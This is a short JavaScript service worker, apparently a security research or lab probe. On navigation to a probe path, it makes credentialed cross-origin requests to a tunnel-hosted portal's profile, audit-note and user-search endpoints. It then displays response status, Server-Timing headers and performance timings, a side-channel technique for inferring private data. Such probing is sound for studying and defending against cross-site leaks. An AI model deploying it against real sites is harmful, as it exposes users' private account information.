const PORTAL = 'https://protecting-capacity-original-intent.trycloudflare.com';
self.addEventListener("install", e => self.skipWaiting());
self.addEventListener("activate", e => e.waitUntil(self.clients.claim()));
self.addEventListener("fetch", event => {
  const u = new URL(event.request.url);
  const probePath = new URL("./__sw_probe__", self.registration.scope).pathname;
  if (event.request.mode !== "navigate" || u.pathname !== probePath) return;
  event.respondWith((async () => {
    const kind = (u.searchParams.get("target") || "search").toLowerCase();
    const path = kind === "me" ? "/api/profile/me" :
      kind === "note" ? "/api/profile/audit-note?employee_id=bob" :
      "/api/profile/search?username=bob";
    let result = {kind, status:"not-run"};
    try {
      const r = await fetch(PORTAL + path, {mode:"cors",credentials:"include",cache:"no-store"});
      result.status = r.status;
      result.serverTimingHeader = r.headers.get("Server-Timing");
      await r.body?.cancel();
    } catch(e) { result.error = String(e); }
    const esc = s => String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
    const html = `<!doctype html><meta charset="utf-8"><title>SW navigation probe</title>
      <h1>SW navigation result</h1><pre id="r">${esc(JSON.stringify(result,null,2))}</pre>
      <pre id="p">loading performance entries…</pre>
      <script>addEventListener("load",()=>{document.querySelector("#p").textContent=JSON.stringify(performance.getEntries().map(e=>({type:e.entryType,name:e.name,responseStatus:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))})),null,2)})</script>`;
    return new Response(html,{headers:{"Content-Type":"text/html; charset=utf-8","Cache-Control":"no-store"}});
  })());
});
